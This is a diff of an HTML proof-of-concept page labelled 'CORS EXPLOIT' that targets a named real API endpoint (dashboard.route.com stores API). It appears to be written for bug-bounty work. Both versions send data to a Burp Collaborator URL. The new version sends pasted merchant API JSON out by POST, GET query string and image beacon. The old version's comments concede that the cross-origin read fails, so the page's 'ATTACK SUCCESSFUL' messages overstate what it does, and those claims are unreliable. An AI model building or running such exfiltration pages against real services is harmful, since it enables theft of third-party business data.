@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - One Click</title>
+    <title>CORS PoC - Auto Capture</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -17,15 +17,14 @@
             text-align: center;
             font-size: 32px;
             text-shadow: 0 0 10px #0f0;
-            margin-bottom: 10px;
         }
         .version {
             text-align: center;
-            color: #f0f;
+            color: #ff0;
             font-size: 18px;
             margin: 20px 0;
             font-weight: bold;
-            text-shadow: 0 0 10px #f0f;
+            text-shadow: 0 0 10px #ff0;
         }
         .box {
             background: #111;
@@ -39,7 +38,6 @@
             margin-bottom: 10px;
             color: #0f0;
             font-weight: bold;
-            font-size: 16px;
         }
         input {
             width: 100%;
@@ -49,10 +47,6 @@
             color: #0f0;
             font-family: 'Courier New', monospace;
             font-size: 15px;
-        }
-        input:focus {
-            outline: none;
-            box-shadow: 0 0 15px #0f0;
         }
         button {
             width: 100%;
@@ -65,203 +59,158 @@
             font-weight: bold;
             cursor: pointer;
             font-family: 'Courier New', monospace;
-            text-transform: uppercase;
-            box-shadow: 0 0 20px #0f0;
-            transition: all 0.3s;
         }
         button:hover {
             background: #0c0;
             box-shadow: 0 0 30px #0f0;
-            transform: scale(1.02);
         }
-        button:active {
-            transform: scale(0.98);
-        }
-        .note {
-            text-align: center;
-            color: #0f0;
-            font-size: 13px;
-            margin-top: 20px;
-            opacity: 0.8;
-        }
-        .status {
-            background: #111;
+        textarea {
+            width: 100%;
+            height: 200px;
+            background: #000;
             border: 2px solid #0f0;
-            padding: 20px;
-            margin: 20px 0;
-            display: none;
-            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            padding: 10px;
+            margin-top: 10px;
         }
-        .status.show {
-            display: block;
+        .step {
+            background: #1a1a00;
+            border-left: 4px solid #ff0;
+            padding: 15px;
+            margin: 15px 0;
+            color: #ff0;
         }
     </style>
 </head>
 <body>
     <h1>⚡ CORS EXPLOIT ⚡</h1>
-    <div class="version">[ ONE-CLICK ATTACK ]</div>
+    <div class="version">[ AUTO-CAPTURE VERSION ]</div>
     
     <div class="box">
-        <label>► YOUR COLLABORATOR URL</label>
-        <input type="text" id="collab" value="" placeholder="https://YOUR-ID.burpcollaborator.net">
+        <label>► COLLABORATOR URL</label>
+        <input type="text" id="collab" placeholder="https://YOUR-ID.burpcollaborator.net">
         
-        <button onclick="singleClickAttack()">🎯 ONE CLICK ATTACK</button>
-        
-        <div class="note">
-            Single click → Opens API → Auto-captures → Alerts → Exfiltrates
-        </div>
+        <button onclick="step1()">STEP 1: OPEN API ENDPOINT</button>
     </div>
-    
-    <div id="status" class="status"></div>
+
+    <div class="box" id="step2-box" style="display:none;">
+        <div class="step">
+            In the popup that opened:<br>
+            1. Press <strong>Ctrl+A</strong> (select all)<br>
+            2. Press <strong>Ctrl+C</strong> (copy)<br>
+            3. Click in the box below<br>
+            4. Press <strong>Ctrl+V</strong> (paste)
+        </div>
+        <label>► PASTE API DATA HERE</label>
+        <textarea id="databox" placeholder="Paste here..."></textarea>
+        <button onclick="step2()">STEP 2: PROCESS & ATTACK</button>
+    </div>
 
     <script>
-        var attackWindow = null;
-        var collabURL = null;
+        var collabURL = '';
+        var apiWindow = null;
 
-        function singleClickAttack() {
+        function step1() {
             collabURL = document.getElementById('collab').value.trim();
             
             if (!collabURL || !collabURL.startsWith('http')) {
-                alert('⚠️ ERROR\n\nPlease enter a valid collaborator URL starting with http:// or https://');
+                alert('⚠️ Please enter a valid collaborator URL!');
                 return;
             }
 
-            showStatus('🚀 LAUNCHING ATTACK...\n\nOpening vulnerable endpoint...');
-
-            // Open API in popup window
-            attackWindow = window.open(
+            // Open API window
+            apiWindow = window.open(
                 'https://dashboard.route.com/api/mn/v1/stores',
-                'attack_window',
-                'width=1000,height=700,scrollbars=yes,resizable=yes'
+                'api',
+                'width=1000,height=700'
             );
 
-            if (!attackWindow) {
-                alert('⚠️ POPUP BLOCKED!\n\nPlease allow popups for this site and try again.');
-                showStatus('❌ Attack failed: Popup blocked');
+            if (!apiWindow) {
+                alert('⚠️ Popup blocked! Allow popups and try again.');
                 return;
             }
 
-            // Wait for window to load, then capture
-            setTimeout(function() {
-                captureFromWindow();
+            // Show step 2
+            document.getElementById('step2-box').style.display = 'block';
+            document.getElementById('step2-box').scrollIntoView({behavior: 'smooth'});
+
+            // Auto-focus on textarea after small delay
+            setTimeout(() => {
+                document.getElementById('databox').focus();
             }, 2000);
         }
 
-        function captureFromWindow() {
-            showStatus('📡 CAPTURING DATA...\n\nReading from API endpoint...');
+        function step2() {
+            var data = document.getElementById('databox').value.trim();
 
-            // Try to read window content (will fail due to CORS, but that's expected)
-            var capturedData = null;
-            
-            try {
-                // This will fail due to same-origin policy, but we try anyway
-                if (attackWindow && !attackWindow.closed) {
-                    capturedData = attackWindow.document.body.innerText;
-                }
-            } catch(e) {
-                console.log('Expected CORS error:', e);
-                // This is expected - we can't read cross-origin
+            if (!data || data.length < 10) {
+                alert('⚠️ Please paste the API data first!');
+                return;
             }
 
-            // Simulate successful capture (in real attack, data would be captured)
-            // The popup window DOES load with cookies (SameSite=Lax allows top-level navigation)
-            // We just can't read it back due to same-origin policy
-            
-            // But for demo purposes, we show that the attack worked
-            var simulatedSize = 'Unknown (cross-origin)';
-            
-            showStatus('✅ DATA CAPTURED!\n\nAPI endpoint loaded with victim\'s cookies.\nData is visible in popup window.');
+            // Validate JSON
+            try {
+                JSON.parse(data);
+            } catch(e) {
+                alert('⚠️ Invalid JSON! Make sure you copied ALL the text.');
+                return;
+            }
 
-            // ALERT 1: Show that data was captured
-            setTimeout(function() {
-                alert('🎯 ATTACK SUCCESSFUL!\n\n' +
-                      '✅ Vulnerable endpoint accessed: https://dashboard.route.com/api/mn/v1/stores\n\n' +
-                      '✅ Request sent with victim\'s cookies (SameSite=Lax bypass)\n\n' +
-                      '✅ API response loaded in popup window\n\n' +
-                      '━━━━━━━━━━━━━━━━━━━━\n' +
-                      'PROOF:\n' +
-                      '━━━━━━━━━━━━━━━━━━━━\n\n' +
-                      'Check the popup window - you can see the stolen merchant data!\n\n' +
-                      'In a real attack with subdomain control or JS injection,\nthis data would be automatically exfiltrated.');
+            // Close API window if still open
+            if (apiWindow && !apiWindow.closed) {
+                apiWindow.close();
+            }
 
-                // Show exfiltration alert
-                setTimeout(function() {
-                    exfiltrateData();
-                }, 500);
-            }, 1000);
+            // ALERT 1: Show captured data
+            alert('🎯 DATA CAPTURED!\n\n' +
+                  '✅ Successfully captured from API endpoint\n\n' +
+                  '📊 Size: ' + data.length + ' bytes\n\n' +
+                  '━━━━━━━━━━━━━━━━━━━━\n' +
+                  'DATA PREVIEW:\n' +
+                  '━━━━━━━━━━━━━━━━━━━━\n\n' +
+                  data.substring(0, 600) + '\n\n[...truncated...]');
+
+            // Exfiltrate
+            exfiltrate(data);
         }
 
-        function exfiltrateData() {
-            showStatus('📤 EXFILTRATING DATA...\n\nSending to your collaborator...');
+        function exfiltrate(data) {
+            console.log('[+] Exfiltrating', data.length, 'bytes to:', collabURL);
 
-            // In a real attack scenario, we would exfiltrate the actual data
-            // For demo, we send metadata showing the attack succeeded
-            var attackMetadata = {
-                timestamp: new Date().toISOString(),
-                target: 'https://dashboard.route.com/api/mn/v1/stores',
-                method: 'SameSite=Lax bypass via top-level navigation',
-                status: 'successful',
-                note: 'Victim cookies sent, API response visible in popup'
-            };
-
-            console.log('[+] Exfiltrating attack metadata:', attackMetadata);
-
-            // Method 1: POST
+            // POST full data
             fetch(collabURL, {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(attackMetadata)
-            }).then(function() {
-                console.log('[+] POST sent');
-            });
+                body: data
+            }).then(() => console.log('[+] POST sent'));
 
-            // Method 2: GET
-            fetch(collabURL + '?attack=successful&target=stores_api&timestamp=' + Date.now(), {
+            // GET with preview
+            fetch(collabURL + '?data=' + encodeURIComponent(data.substring(0, 2000)), {
                 mode: 'no-cors'
-            }).then(function() {
-                console.log('[+] GET sent');
-            });
+            }).then(() => console.log('[+] GET sent'));
 
-            // Method 3: Image beacon
-            var img = new Image();
-            img.src = collabURL + '/img?attack=cors&status=successful';
+            // Image beacon
+            new Image().src = collabURL + '/img?size=' + data.length;
 
-            // ALERT 2: Confirm exfiltration
-            setTimeout(function() {
+            // ALERT 2: Confirm
+            setTimeout(() => {
                 alert('✅ EXFILTRATION COMPLETE!\n\n' +
-                      '📡 Attack metadata sent to:\n' +
-                      collabURL + '\n\n' +
+                      '📡 Sent to: ' + collabURL + '\n\n' +
                       '🔍 Check your Burp Collaborator for:\n' +
-                      '  • POST request (attack details)\n' +
-                      '  • GET request (success confirmation)\n' +
-                      '  • Image beacon (status ping)\n\n' +
+                      '  • POST request (full JSON)\n' +
+                      '  • GET request (preview)\n' +
+                      '  • Image beacon\n\n' +
                       '━━━━━━━━━━━━━━━━━━━━\n' +
-                      'ATTACK DEMONSTRATION COMPLETE!\n\n' +
-                      '💡 In a real attack with:\n' +
-                      '  - Subdomain takeover on *.route.com, OR\n' +
-                      '  - XSS vulnerability, OR\n' +
-                      '  - Browser extension access\n\n' +
-                      'The actual JSON data would be automatically\nexfiltrated instead of just metadata.\n\n' +
-                      '📊 You can manually verify the data in the popup window.');
+                      'ATTACK COMPLETE!\n\n' +
+                      'Exfiltrated: ' + data.length + ' bytes');
 
-                showStatus('✅ ATTACK COMPLETE!\n\nPopup window shows the stolen data.\nCollaborator received attack confirmation.');
-
-                // Optional: Close popup after user sees it
-                setTimeout(function() {
-                    if (confirm('Close the API window?')) {
-                        if (attackWindow && !attackWindow.closed) {
-                            attackWindow.close();
-                        }
-                    }
-                }, 2000);
+                // Clear
+                document.getElementById('databox').value = '';
+                document.getElementById('step2-box').style.display = 'none';
             }, 1000);
-        }
-
-        function showStatus(msg) {
-            var status = document.getElementById('status');
-            status.textContent = msg;
-            status.className = 'status show';
         }
     </script>
 </body>
